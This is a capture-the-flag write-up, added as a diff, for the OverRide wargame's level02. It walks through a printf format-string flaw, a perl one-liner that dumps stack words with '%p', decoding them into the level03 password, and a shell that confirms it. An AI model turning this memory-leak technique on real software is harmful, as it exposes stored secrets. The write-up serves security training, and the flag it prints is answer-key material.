@@ -1,0 +1,36 @@
+1. The main opens the pass file of the level03 and store it in the stack
+2. After that, the program ask for an username and a password. Both are store in the stack.
+3. The password is compared to the content of the pass of the level03. If it isnt a match, the username is printed with additionnal text and the program ends
+4. The flaw is in the manner the username is displayed. Printf is used to display the username but it is directly the format string.
+5. So we can use a Format String Attack to read and write data arbitrary.
+6. With %p, we can print addresses in hexadecimal. As long as we use it, it will display the stack.
+7. As i mentionned earlier, the .pass file is store in the stack. So if we use enough %p, it will display enough data to display de flag.
+8. Here is the command to run the program with many %p : perl -e 'print "%p "x30' | ./level02
+9. And here is the result :
+
+level02@OverRide:~$ perl -e 'print "%p "x30' | ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+0x7fffffffea10 (nil) (nil) 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffec08 0x1f7ff9a08 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
+
+10. If we only keep this portion : 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d
+11. Convert in Big Endian and join them : 4868373452506E7551397361354A414558674E5743717A377358476E68354A354D394B6650673348
+12. Finally, we can convert these hexadecimal data to text : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H. It look like a flag !
+13. The fun thing that i note mentionned is if we have the flag as password, the program spawn a shell. So we can confirm the win !
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: level02
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, level02!
+$ cat ~level03/.pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+$
+
